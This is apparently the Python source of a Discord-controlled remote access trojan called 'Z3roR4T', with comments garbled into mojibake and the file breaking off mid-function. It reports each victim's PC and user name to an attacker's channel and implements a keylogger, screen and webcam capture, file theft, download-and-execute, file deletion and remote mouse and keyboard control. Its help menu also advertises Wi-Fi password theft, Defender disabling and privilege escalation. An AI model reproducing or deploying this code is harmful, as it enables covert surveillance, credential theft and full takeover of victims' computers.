import discord
from discord.ext import commands
import pyautogui
import os
import shutil
import subprocess
import requests
import io
import time
import threading
import asyncio
import logging
import socket
import platform
import psutil
import cv2
import ctypes
import pyttsx3
from pynput.keyboard import Controller as KeyboardController, Key, Listener
from pynput.mouse import Controller as MouseController, Button
from PIL import Image
from PyQt6.QtWidgets import QApplication, QWidget, QLabel, QPushButton, QVBoxLayout, QHBoxLayout, QLineEdit
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import sys
import psutil
import random
import pygetwindow as gw
import win32api
import win32con
import win32gui
import win32process
import win32clipboard
import win32file
import win32com.client
import re
import winreg
import numpy as np
import sounddevice as sd
import wave
import pygame
import pyaudio
import urllib.request
import zipfile
import winshell
import winreg
import wmi

logging.basicConfig(level=logging.INFO)

# –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –ø—Ä–µ—Ñ–∏–∫—Å –∫–æ–º–∞–Ω–¥ –∏ —Å–æ–∑–¥–∞–µ–º –æ–±—ä–µ–∫—Ç –±–æ—Ç–∞
intents = discord.Intents.default()
intents.message_content = True  # –î–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —Å–æ–æ–±—â–µ–Ω–∏–π
mouse = MouseController()

bot = commands.Bot(command_prefix="!", intents=intents)

# –ü—É—Ç—å –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –≤—Ä–µ–º–µ–Ω–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤
appdata_path = os.path.expanduser("~") + "\\AppData\\Local\\Temp"
token = '{TOKEN}'
AUTHORIZED_CHANNEL_ID = {ACESS}  # –ó–∞–º–µ–Ω–∏—Ç–µ –Ω–∞ ID –≤–∞—à–µ–≥–æ –∫–∞–Ω–∞–ª–∞

# keyboard
key_buffer = []
log = []  # –õ–æ–≥ –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è —Å—Ç—Ä–æ–∫
keyboard_listener = None  # –§–ª–∞–≥ –¥–ª—è —Ä–∞–±–æ—Ç—ã —Å–ª—É—à–∞—Ç–µ–ª—è
keyboard_task = None  # –ó–∞–¥–∞—á–∞ –¥–ª—è –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è —Å–æ–æ–±—â–µ–Ω–∏–π
latest_message = None  # –°—Å—ã–ª–∫–∞ –Ω–∞ –ø–æ—Å–ª–µ–¥–Ω–µ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –±–æ—Ç–∞

KEY_LAYOUTS = {
    0x409: "eng",  # –ê–Ω–≥–ª–∏–π—Å–∫–∏–π
    0x419: "rus"   # –†—É—Å—Å–∫–∏–π
}

# –¢–∞–±–ª–∏—Ü—ã –ø–µ—Ä–µ–≤–æ–¥–∞ —Å–∏–º–≤–æ–ª–æ–≤ –¥–ª—è —Ä–∞–∑–Ω—ã—Ö —è–∑—ã–∫–æ–≤
ENG_TO_RUS = str.maketrans(
    "qwertyuiop[]asdfghjkl;'zxcvbnm,.",
    "–π—Ü—É–∫–µ–Ω–≥—à—â–∑—Ö—ä—Ñ—ã–≤–∞–ø—Ä–æ–ª–¥–∂—ç—è—á—Å–º–∏—Ç—å–±—é"
)
RUS_TO_ENG = str.maketrans(
    "–π—Ü—É–∫–µ–Ω–≥—à—â–∑—Ö—ä—Ñ—ã–≤–∞–ø—Ä–æ–ª–¥–∂—ç—è—á—Å–º–∏—Ç—å–±—é",
    "qwertyuiop[]asdfghjkl;'zxcvbnm,."
)

current_path = "C:/"

@bot.event
async def on_ready():
    # –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ü–ö –∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ
    pc_name = socket.gethostname()
    username = os.getlogin()
    file_name = os.path.basename(sys.argv[0])
    
    # –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ
    message = f"**üëãPC**: {pc_name}\n**üë§User**: {username}\n**üìÅFile**: {file_name} \n**‚ú® https://dsc.gg/ZeroTiss**"
    
    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –≤ –∫–∞–Ω–∞–ª
    channel = bot.get_channel(AUTHORIZED_CHANNEL_ID)
    if channel:
        await channel.send(message)

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞—Ö–≤–∞—Ç–∞ —Å–∫—Ä–∏–Ω—à–æ—Ç–∞
def capture_screen():
    screenshot = pyautogui.screenshot()
    return screenshot

#--------------------------------keyboard

def get_current_language():
    """–û–ø—Ä–µ–¥–µ–ª—è–µ—Ç —Ç–µ–∫—É—â–∏–π —è–∑—ã–∫ –≤–≤–æ–¥–∞."""
    hwnd = win32gui.GetForegroundWindow()  # –ü–æ–ª—É—á–∞–µ–º –∞–∫—Ç–∏–≤–Ω–æ–µ –æ–∫–Ω–æ
    thread_id, _ = win32process.GetWindowThreadProcessId(hwnd)  # –ü–æ–ª—É—á–∞–µ–º ID –ø–æ—Ç–æ–∫–∞ –æ–∫–Ω–∞
    layout = win32api.GetKeyboardLayout(thread_id)  # –ü–æ–ª—É—á–∞–µ–º —Ä–∞—Å–∫–ª–∞–¥–∫—É –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã
    lang_code = layout & (2**16 - 1)
    
    KEY_LAYOUTS = {
        0x409: "eng",  # –ê–Ω–≥–ª–∏–π—Å–∫–∏–π
        0x419: "rus"   # –†—É—Å—Å–∫–∏–π
    }
    
    return KEY_LAYOUTS.get(lang_code, "eng")  # –ü–æ —É–º–æ–ª—á–∞–Ω–∏—é –∞–Ω–≥–ª–∏–π—Å–∫–∏–π
def on_press(key):
    """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ –Ω–∞–∂–∞—Ç–∏–π –∫–ª–∞–≤–∏—à."""
    global log
    try:
        current_lang = get_current_language()  # –û–ø—Ä–µ–¥–µ–ª—è–µ–º —Ç–µ–∫—É—â–∏–π —è–∑—ã–∫

        if hasattr(key, 'char') and key.char:
            char = key.char
            if current_lang == "rus":
                char = char.translate(ENG_TO_RUS)  # –ö–æ–Ω–≤–µ—Ä—Ç–∏—Ä—É–µ–º –∞–Ω–≥–ª–∏–π—Å–∫–∏–µ —Å–∏–º–≤–æ–ª—ã –≤ —Ä—É—Å—Å–∫–∏–µ
            key_buffer.append(char)

        elif key == key.space:
            key_buffer.append(" ")

        elif key == key.enter:
            log.insert(0, ''.join(key_buffer) + " [Enter]")
            key_buffer.clear()

        elif key == key.backspace and key_buffer:
            key_buffer.pop()

    except Exception as e:
        print(f"–û—à–∏–±–∫–∞: {e}")

def start_keyboard_listener():
    """–ó–∞–ø—É—Å–∫ —Å–ª—É—à–∞—Ç–µ–ª—è –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã."""
    global keyboard_listener
    if keyboard_listener is None:
        keyboard_listener = Listener(on_press=on_press)
        keyboard_listener.start()

def stop_keyboard_listener():
    """–û—Å—Ç–∞–Ω–æ–≤–∫–∞ —Å–ª—É—à–∞—Ç–µ–ª—è."""
    global keyboard_listener
    if keyboard_listener:
        keyboard_listener.stop()
        keyboard_listener = None

async def update_keyboard_log(ctx):
    """–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ —Å–æ–æ–±—â–µ–Ω–∏—è —Å –ª–æ–≥–∞–º–∏ –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã."""
    global latest_message
    while keyboard_listener:
        if log:
            captured_text = "\n".join(log[:10])
            if latest_message:
                try:
                    await latest_message.edit(content=f"‚å®Ô∏è Listener:\n```\n{captured_text}\n```")
                except discord.errors.NotFound:
                    latest_message = await ctx.send(f"‚å®Ô∏è Listener:\n```\n{captured_text}\n```")
            else:
                latest_message = await ctx.send(f"‚å®Ô∏è Listener:\n```\n{captured_text}\n```")
        await asyncio.sleep(1)

@bot.command()
async def keyboard(ctx, mode: str):
    """–í–∫–ª—é—á–µ–Ω–∏–µ/–≤—ã–∫–ª—é—á–µ–Ω–∏–µ –∑–∞—Ö–≤–∞—Ç–∞ –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã."""
    global keyboard_task, latest_message

    if ctx.channel.id != AUTHORIZED_CHANNEL_ID:
        return await ctx.send("‚ùå Unauthorized channel!")

    if mode.lower() == "on":
        key_buffer.clear()
        log.clear()
        start_keyboard_listener()
        latest_message = await ctx.send("‚å®Ô∏è Keyboard listener started.")

        if keyboard_task is None:
            keyboard_task = asyncio.create_task(update_keyboard_log(ctx))

    elif mode.lower() == "off":
        stop_keyboard_listener()
        if keyboard_task:
            keyboard_task.cancel()
            keyboard_task = None

        if log:
            captured_text = "\n".join(log[:10])
            await ctx.send(f"‚å®Ô∏è Final log:\n```\n{captured_text}\n```")
        else:
            await ctx.send("‚å®Ô∏è No keys captured.")

    else:
        await ctx.send("‚ùå Invalid usage! Use `!keyboard on` or `!keyboard off`.")

#--------------------------------keyboard


#--------------------------------new

@bot.command()
async def sendtext(ctx, *, text: str):
    """–≠–º—É–ª–∏—Ä—É–µ—Ç –≤–≤–æ–¥ —Ç–µ–∫—Å—Ç–∞ –Ω–∞ –∫–ª–∞–≤–∏–∞—Ç—É—Ä–µ."""
    if ctx.channel.id != AUTHORIZED_CHANNEL_ID:
        await ctx.send('‚ùå Unauthorized channel!')
        return

    keyboard = KeyboardController()  # –£–±–µ–¥–∏–º—Å—è, —á—Ç–æ –æ–±—ä–µ–∫—Ç –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã —Å–æ–∑–¥–∞–Ω

    for char in text:
        keyboard.type(char)
        await asyncio.sleep(0.05)  # –ù–µ–±–æ–ª—å—à–∞—è –∑–∞–¥–µ—Ä–∂–∫–∞ –¥–ª—è –µ—Å—Ç–µ—Å—Ç–≤–µ–Ω–Ω–æ–≥–æ –≤–≤–æ–¥–∞

    await ctx.send(f'‚úÖ Pasted text: `{text}`')

@bot.command()
async def changelang(ctx):
    """–ú–µ–Ω—è–µ—Ç —è–∑—ã–∫ –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã (Alt + Shift)."""
    if ctx.channel.id != AUTHORIZED_CHANNEL_ID:
        await ctx.send('‚ùåUnauthorized channel!')
        return
    keyboard.press(Key.alt)
    keyboard.press(Key.shift)
    keyboard.release(Key.shift)
    keyboard.release(Key.alt)
    await ctx.send('‚úÖ Changed Language')

mouse_control_sessions = {}

@bot.command()
async def mousemove(ctx, speed: int = 20):
    """–í–∫–ª—é—á–∞–µ—Ç —É–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –º—ã—à–∫–æ–π —á–µ—Ä–µ–∑ —Å—Ç—Ä–µ–ª–∫–∏ –≤ Discord."""
    if ctx.channel.id != AUTHORIZED_CHANNEL_ID:
        await ctx.send('‚ùåUnauthorized channel!')
        return
    if ctx.author.id in mouse_control_sessions:
        await ctx.send('‚ö†Ô∏è Mouse is alredy active!')
        return
    
    view = discord.ui.View()
    directions = {'‚¨ÖÔ∏è': (-speed, 0), '‚û°Ô∏è': (speed, 0), '‚¨ÜÔ∏è': (0, -speed), '‚¨áÔ∏è': (0, speed)}
    
    async def move_callback(interaction, dx, dy):
        if interaction.user.id == ctx.author.id:
            mouse.move(dx, dy)
            await interaction.response.defer()
    
    for emoji, (dx, dy) in directions.items():
        button = discord.ui.Button(emoji=emoji, style=discord.ButtonStyle.primary)
        button.callback = lambda i, dx=dx, dy=dy: move_callback(i, dx, dy)
        view.add_item(button)
    
    left_click = discord.ui.Button(label='–õ–ö–ú', style=discord.ButtonStyle.success)
    async def left_click_callback(interaction):
        if interaction.user.id == ctx.author.id:
            mouse.click(Button.left)
            await interaction.response.defer()
    left_click.callback = left_click_callback
    view.add_item(left_click)
    
    right_click = discord.ui.Button(label='–ü–ö–ú', style=discord.ButtonStyle.success)
    async def right_click_callback(interaction):
        if interaction.user.id == ctx.author.id:
            mouse.click(Button.right)
            await interaction.response.defer()
    right_click.callback = right_click_callback
    view.add_item(right_click)
    
    close_button = discord.ui.Button(label='X', style=discord.ButtonStyle.danger)
    async def close_callback(interaction):
        if interaction.user.id == ctx.author.id:
            mouse_control_sessions.pop(ctx.author.id, None)
            await interaction.message.delete()
    close_button.callback = close_callback
    view.add_item(close_button)
    
    mouse_control_sessions[ctx.author.id] = view
    await ctx.send('üéÆ Mouse mover:', view=view)

#--------------------------------new


#--------------------------------FFMPEG


def capture_webcams():
    images = []
    index = 0
    while True:
        cap = cv2.VideoCapture(index)
        if not cap.isOpened():
            break  # –ï—Å–ª–∏ –∫–∞–º–µ—Ä–∞ –Ω–µ –æ—Ç–∫—Ä—ã–≤–∞–µ—Ç—Å—è, –∑–Ω–∞—á–∏—Ç, –±–æ–ª—å—à–µ –∏—Ö –Ω–µ—Ç
        ret, frame = cap.read()
        if ret:
            _, img_encoded = cv2.imencode('.png', frame)
            images.append(io.BytesIO(img_encoded.tobytes()))
        cap.release()
        index += 1
    return images


# –§—É–Ω–∫—Ü–∏—è –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è —Ñ–∞–π–ª–∞
def delete_file(file_path):
    try:
        os.remove(file_path)
    except Exception as e:
        print(f"Error deleting file: {e}")

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —Ñ–∞–π–ª–∞
def execute_file(file_path):
    try:
        subprocess.run([file_path], check=True)
    except Exception as e:
        print(f"Error executing file: {e}")

# –ö–æ–º–∞–Ω–¥–∞ –¥–ª—è –∑–∞—Ö–≤–∞—Ç–∞ —Å–∫—Ä–∏–Ω—à–æ—Ç–∞ —Å —ç–∫—Ä–∞–Ω–∞
@bot.command()
async def photo_desk(ctx):
    if ctx.channel.id != AUTHORIZED_CHANNEL_ID:
        return await ctx.send("‚ùå Unauthorized channel!")
    
    screenshot = capture_screen()
    with io.BytesIO() as image_binary:
        screenshot.save(image_binary, "PNG")
        image_binary.seek(0)
        await ctx.send(file=discord.File(fp=image_binary, filename="screenshot.png"))

@bot.command()
async def photo_cam(ctx):
    if ctx.channel.id != AUTHORIZED_CHANNEL_ID:
        return await ctx.send("‚ùå Unauthorized channel!")
    
    images = capture_webcams()
    if not images:
        await ctx.send("‚ùå No webcam aviable!")
        return
    
    for i, image_binary in enumerate(images):
        image_binary.seek(0)
        await ctx.send(file=discord.File(fp=image_binary, filename=f"webcam_image_{i}.png"))

@bot.command()
async def upload(ctx, file_path: str):
    if ctx.channel.id != AUTHORIZED_CHANNEL_ID:
        return await ctx.send("‚ùå Unauthorized channel!")

    if not os.path.exists(file_path):
        return await ctx.send("‚ùå File not found!")

    try:
        await ctx.send(file=discord.File(file_path))  # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ñ–∞–π–ª –≤ Discord
        await ctx.send(f"‚úÖ File `{os.path.basename(file_path)}` uploaded successfully!")
    except Exception as e:
        await ctx.send(f"‚ùå Error uploading file: {e}")

# –ö–æ–º–∞–Ω–¥–∞ –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è —Ñ–∞–π–ª–∞
@bot.command()
async def delete(ctx, file_path: str):
    if ctx.channel.id != AUTHORIZED_CHANNEL_ID:
        return await ctx.send("‚ùåUnauthorized channel!")
    
    delete_file(file_path)
    await ctx.send(f"‚ùåFile {file_path} deleted")

# –ö–æ–º–∞–Ω–¥–∞ –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —Ñ–∞–π–ª–∞
@bot.command()
async def execute(ctx, file_path: str):
    if ctx.channel.id != AUTHORIZED_CHANNEL_ID:
        return await ctx.send("‚ùåUnauthorized channel!")
    
    execute_file(file_path)
    await ctx.send(f"‚úÖExecuted file: {file_path}")


@bot.command()
async def download(ctx, url: str, path: str):
    if ctx.channel.id != AUTHORIZED_CHANNEL_ID:
        return await ctx.send("‚ùå Unauthorized channel!")
    
    try:
        response = requests.get(url, stream=True)
        with open(path, 'wb') as file:
            file.write(response.content)
        await ctx.send(f"‚úÖ File downloaded to {path}")
    except Exception as e:
        await ctx.send(f"‚ùå Error downloading file: {e}")


# –ö–æ–º–∞–Ω–¥–∞ –¥–ª—è –≤–∫–ª—é—á–µ–Ω–∏—è/–≤—ã–∫–ª—é—á–µ–Ω–∏—è –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–∞ (–º–µ—Å—Ç–æ –¥–ª—è –≤–∞—à–µ–π –ª–æ–≥–∏–∫–∏)
@bot.command()
async def acbypass(ctx, action: str):
    if ctx.channel.id != AUTHORIZED_CHANNEL_ID:
        return await ctx.send("‚ùåUnauthorized channel!")
    
    if action == 'on':
        # –õ–æ–≥–∏–∫–∞ –≤–∫–ª—é—á–µ–Ω–∏—è –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–∞
        await ctx.send("‚úÖAntivirus enabled.")
    elif action == 'off':
        # –õ–æ–≥–∏–∫–∞ –æ—Ç–∫–ª—é—á–µ–Ω–∏—è –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–∞
        await ctx.send("‚ùåAntivirus disabled.")
    else:
        await ctx.send("‚ùåInvalid action. Use 'on' or 'off'.")

# –ö–æ–º–∞–Ω–¥–∞ –¥–ª—è —Å–∞–º–æ—É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏—è –±–æ—Ç–∞
@bot.command()
async def crash(ctx):
    if ctx.channel.id != AUTHORIZED_CHANNEL_ID:
        return await ctx.send("‚ùåUnauthorized channel!")
    
    await ctx.send("üëãCrashing bot code...")
    os.remove(os.path.realpath(__file__))  # –£–¥–∞–ª–µ–Ω–∏–µ —Å–∫—Ä–∏–ø—Ç–∞
    exit()

#------diskcheck

@bot.command()
async def disk(ctx, *args):
    global current_path  # –ò—Å–ø–æ–ª—å–∑—É–µ–º –≥–ª–æ–±–∞–ª—å–Ω—ã–π —Ç–µ–∫—É—â–∏–π –ø—É—Ç—å

    # –§—É–Ω–∫—Ü–∏—è –Ω–æ—Ä–º–∞–ª–∏–∑–∞—Ü–∏–∏ –ø—É—Ç–∏
    def normalize_path(path):
        return path.replace("\\", "/")

    if args:
        # –ï—Å–ª–∏ –ø–µ—Ä–µ–¥–∞–Ω –ø—É—Ç—å, –ø—Ä–æ–±—É–µ–º –ø–µ—Ä–µ–π—Ç–∏ –∫ —É–∫–∞–∑–∞–Ω–Ω–æ–º—É
        new_path = os.path.join(current_path, " ".join(args))
        if os.path.isdir(new_path):
            current_path = new_path  # –û–±–Ω–æ–≤–ª—è–µ–º —Ç–µ–∫—É—â–∏–π –ø—É—Ç—å
        else:
            return await ctx.send(f"‚ùå path `{normalize_path(new_path)}` not found")

    try:
        items = os.listdir(current_path)  # –ü–æ–ª—É—á–∞–µ–º —Å–ø–∏—Å–æ–∫ —Ñ–∞–π–ª–æ–≤ –∏ –ø–∞–ø–æ–∫
        folders = [d for d in items if os.path.isdir(os.path.join(current_path, d))]  # –§–∏–ª—å—Ç—Ä—É–µ–º –ø–∞–ø–∫–∏
        files = [f for f in items if os.path.isfile(os.path.join(current_path, f))]  # –§–∏–ª—å—Ç—Ä—É–µ–º —Ñ–∞–π–ª—ã

        response = f"üìÇ **Data in {normalize_path(current_path)}**:\n"

        if folders:
            response += "\nüìÅ **Folders:**\n" + "\n".join(f"üîπ `{normalize_path(os.path.join(current_path, folder))}`" for folder in folders)
        else:
            response += "\n‚ùå No folders."

        if files:
            response += "\n\nüìÑ **Files:**\n" + "\n".join(f"üìú `{normalize_path(os.path.join(current_path, file))}`" for file in files)
        else:
            response += "\n\n‚ùå No files."

        await ctx.send(response)

    except Exception as e:
        await ctx.send(f"‚ùå Error: {e}")

#------diskcheck

@bot.command()
async def helprat(ctx):
    if ctx.channel.id != AUTHORIZED_CHANNEL_ID:
        return await ctx.send("‚ùå Unauthorized channel!")

    embed = discord.Embed(title="‚≠ê Z3roR4T Commands", color=discord.Color(0xFFFFFF))

    commands_dict = {
        "üõ† User interact": [
            "`!sendtext <text>` ‚Äì Simulate keyboard input.",
            "`!mousemove` ‚Äì Enable mouse movement control.",
            "`!changelang` ‚Äì Switch keyboard language (Alt+Shift).",
            "`!keybind <key1>+<key2>` ‚Äì Simulate key combination.",
            "`!textbox <text> <buttons>` ‚Äì Create a textbox with buttons.",
            "`!msgbox <title> <text>` ‚Äì Display a message box with text.",
        ],
        "üïµÔ∏è Spying": [
            "`!photo_desk` ‚Äì Capture a screenshot of the desktop.",
            "`!photo_cam` ‚Äì Take a photo using the webcam.",
            "`!video_desk` ‚Äì Capture a screen recording.",
            "`!video_cam` ‚Äì Record a video from the webcam.",
            "`!audiorec <microphone> <duration>` ‚Äì Record audio from the microphone.",
            "`!keyboard <on/off>` ‚Äì Enable/disable keylogger.",
            "`!clipboard <show/add>` ‚Äì Get last clipboard or Add to clipboard.",
            "`!sysinfo` ‚Äì Gets ALL info about PC.",
        ],
        "üìÇ File Management": [
            "`!upload <file_path>` ‚Äì Upload a file from disk.",
            "`!delete <file_path>` ‚Äì Delete a file from disk.",
            "`!execute <file_path>` ‚Äì Execute a file.",
            "`!download <url> <destination>` ‚Äì Download a file to disk.",
            "`!disk <path>` ‚Äì Show files in the specified directory (default: C:/).",
            "`!autoload <name> <method> <on/off> - Adds program in AutoStartup",
        ],
        "üíª Windows Control": [
            "`!shutdown` ‚Äì Shut down the PC.",
            "`!restart` ‚Äì Restart the PC.",
            "`!lock` ‚Äì Lock the screen.",
            "`!volume <0-100>` ‚Äì Set system volume.",
            "`!lockmgr <on/off>` ‚Äì Enable/disable Task Manager.",
            "`!achbypass <on/off>` ‚Äì Enable/disable Windows Defender (if possible).",
            "`!unlocksound` - Unlocks sounds if its disabled on windows (may not work).",
            "`!Microlist` - sends a list of microphones in PC.",
        ],
        "üåê Internet & Network": [
            "`!ping <site>` ‚Äì Ping a website from the PC.",
            "`!packet <site>` ‚Äì Send packets to a server.",
            "`!netinfo` ‚Äì Display network information.",
            "`!wifipass` ‚Äì Retrieve saved Wi-Fi passwords.",
        ],
        "üé® Graphics & Fun": [
            "`!wallpaper <url>` ‚Äì Changes wallpaper to URL Image.",
            "`!memz <On/Off>` ‚Äì Enables MEMZ Effects [Safe version].",
            "`!invert <on/off>` ‚Äì Enable/disable screen inversion. [‚ö†Ô∏èFixing]",
            "`!flipscreen <up/down/left/right/reset>` ‚Äì Rotate the screen.",
            "`!cd` ‚Äì Open/close CD tray.",
            "`!rickroll` ‚Äì Play Rick Astley‚Äôs song in full screen.",
            "`!tts <text>` ‚Äì Make Windows read text out loud.",
            "`!sound <url>` ‚Äì Download and plays sound from url.",
            "`!shake <ins> <on/off>` ‚Äì Shaking cursor.",
        ],
        "‚öôÔ∏è Console & Processes": [
            "`!tasklist` ‚Äì List running processes.",
            "`!taskkill <name>` ‚Äì Kill a specific process.",
            "`!taskmake <task>` ‚Äì Start a new process.",
            "`!cmd <command>` ‚Äì Execute a CMD command.",
            "`!powershell <command>` ‚Äì Execute a PowerShell command.",
            "`!bsod` ‚Äì Executing BSOD.",
        ],
        "üõ† Admin & Other": [
            "`!checkadmin` ‚Äì Check admin rights.",
            "`!admin <title> <icon_url> [method]` ‚Äì Attempt admin privilege escalation.",
            "`!legitadmin` ‚Äì Gain admin rights from a file.",
            "`!acbypass <on/off>` ‚Äì Enable/Disable antivirus bypass [‚ö†Ô∏èFixing].",
            "`!suicide` ‚Äì Self-destruct the bot [‚ö†Ô∏èFixing].",
        ],
    }

    for category, cmds in commands_dict.items():
        embed.add_field(name=category, value="\n".join(cmds), inline=False)

    embed.set_footer(text="Z3roR4T üòà | Owner: Ewinnery | Version: 1.9")

    await ctx.send(embed=embed)

class TextBoxWindow(QWidget):
    def __init__(self, text, buttons, ctx):
        super().__init__()
        self.ctx = ctx
        self.setWindowTitle("Input Box")
        self.setGeometry(200, 200, 400, 200)
        self.input_text = ""

        layout = QVBoxLayout()
        self.label = QLabel(text)
        layout.addWidget(self.label)

        self.input_field = QLineEdit(self)
        layout.addWidget(self.input_field)

        btn_layout = QHBoxLayout()
        for btn_text in buttons:
            btn = QPushButton(btn_text, self)
            btn.clicked.connect(lambda _, b=btn_text: self.on_button_click(b))
            btn_layout.addWidget(btn)
        
        layout.addLayout(btn_layout)
        self.setLayout(layout)

    def on_button_click(self, btn_text):
        self.input_text = self.input_field.text()
        asyncio.run_coroutine_threadsafe(
            self.ctx.send(f"**Selected:** {btn_text}\n**Text:** {self.input_text}"), 
            bot.loop
        )
        self.close()

async def run_gui(text, buttons, ctx):
    app = QApplication(sys.argv)
    window = TextBoxWindow(text, buttons, ctx)
    window.show()
    app.exec()

@bot.command()
async def textbox(ctx, text: str, *buttons):
    if not buttons:
        buttons = ["OK"]  # –ö–Ω–æ–ø–∫–∞ –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é

    threading.Thread(target=asyncio.run, args=(run_gui(text, buttons, ctx),), daemon=True).start()

@bot.command()
async def shutdown(ctx):
    """–í—ã–∫–ª—é—á–∏—Ç—å –ü–ö."""
    await ctx.send("üí§Shutdown...")
    os.system("shutdown /s /t 0")

@bot.command()
async def restart(ctx):
    """–ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –ü–ö."""
    await ctx.send("üí´Restarting...")
    os.system("shutdown /r /t 0")

@bot.command()
async def lock(ctx):
    """–ó–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å —ç–∫—Ä–∞–Ω."""
    await ctx.send("üîíLocked screen...")
    ctypes.windll.user32.LockWorkStation()

@bot.command()
async def tasklist(ctx):
    # –ü–æ–ª—É—á–∞–µ–º –≤—Å–µ –ø—Ä–æ—Ü–µ—Å—Å—ã
    processes = list(psutil.process_iter(attrs=['pid', 'name']))

    # –ü–æ–ª—É—á–∞–µ–º —Å–ø–∏—Å–æ–∫ –æ—Ç–∫—Ä—ã—Ç—ã—Ö –æ–∫–æ–Ω
    open_windows = gw.getWindowsWithTitle('')
    visible_processes = [p for p in processes if any(p.info['name'].lower() in w.title.lower() for w in open_windows)]

    # –ü–æ–ª—É—á–∞–µ–º 5-10 —Å–ª—É—á–∞–π–Ω—ã—Ö —Ñ–æ–Ω–æ–≤—ã—Ö –ø—Ä–æ—Ü–µ—Å—Å–æ–≤
    background_processes = [p for p in processes if p not in visible_processes]
    random_bg_processes = random.sample(background_processes, min(len(background_processes), 20))

    # –§–æ—Ä–º–∏—Ä—É–µ–º —Å–ø–∏—Å–æ–∫ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤
    tasklist_text = "--- Active Windows ---\n"
    for p in visible_processes[:20]:  # –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –¥–æ 10 –∞–∫—Ç–∏–≤–Ω—ã—Ö –æ–∫–æ–Ω
        tasklist_text += f"üîπ {p.info['name']} (PID: {p.info['pid']})\n"

    tasklist_text += "\n--- Author: @Ewinnery ---\n"
    for p in random_bg_processes:  # –ü–æ–∫–∞–∑—ã–≤–∞–µ–º 5-10 —Ñ–æ–Ω–æ–≤—ã—Ö –ø—Ä–æ—Ü–µ—Å—Å–æ–≤
        tasklist_text += f"üî∏ {p.info['name']} (PID: {p.info['pid']})\n"

    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Discord
    await ctx.send(f"```{tasklist_text}```")


@bot.command()
async def taskkill(ctx, *, name: str):
    """–ó–∞–∫—Ä—ã—Ç—å –ø—Ä–æ—Ü–µ—Å—Å –ø–æ –∏–º–µ–Ω–∏."""
    result = subprocess.run(["taskkill", "/F", "/IM", name], capture_output=True, text=True)
    if "SUCCESS" in result.stdout:
        await ctx.send(f"üíÄ{name} Killed!")
    else:
        await ctx.send(f"üíÄ Trying to kill... {name}")

@bot.command()
async def volume(ctx, level: int):
    """–£—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –≥—Ä–æ–º–∫–æ—Å—Ç—å (0-100)."""
    if 0 <= level <= 100:
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume_control = cast(interface, POINTER(IAudioEndpointVolume))
        
        volume_control.SetMasterVolumeLevelScalar(level / 100, None)
        await ctx.send(f"–ì—Ä–æ–º–∫–æ—Å—Ç—å —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞ –Ω–∞ {level}%")
    else:
        await ctx.send("Select 1-100 volume")

@bot.command()
async def msgbox(ctx, title: str, *, text: str):
    if ctx.channel.id != AUTHORIZED_CHANNEL_ID:
        return await ctx.send("‚ùå Unauthorized channel!")
    
    script = f'''
    Add-Type -AssemblyName PresentationFramework;
    [System.Windows.MessageBox]::Show('{text}', '{title}');
    '''
    
    try:
        subprocess.Popen(["powershell", "-Command", script], creationflags=subprocess.CREATE_NO_WINDOW)
        await ctx.send("‚úÖ Sent MSGBOX.")
    except Exception as e:
        await ctx.send(f"‚ùå ERROR: {e}")


@bot.command()
async def tts(ctx, speed: int = 400, pitch: int = 0, *, text: str):
    """–ü—Ä–æ–∏–∑–Ω–µ—Å—Ç–∏ —Ç–µ–∫—Å—Ç –æ—á–µ–Ω—å –±—ã—Å—Ç—Ä–æ –∏ –æ—á–µ–Ω—å –≤—ã—Å–æ–∫–æ."""
    engine = pyttsx3.init()
    
    # –ú–∞–∫—Å–∏–º–∞–ª—å–Ω–∞—è —Å–∫–æ—Ä–æ—Å—Ç—å
    engine.setProperty('rate', min(speed, 500))  # –û–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ–º, —á—Ç–æ–±—ã –Ω–µ –±—ã–ª–æ —Å–ª–∏—à–∫–æ–º –±—ã—Å—Ç—Ä–æ

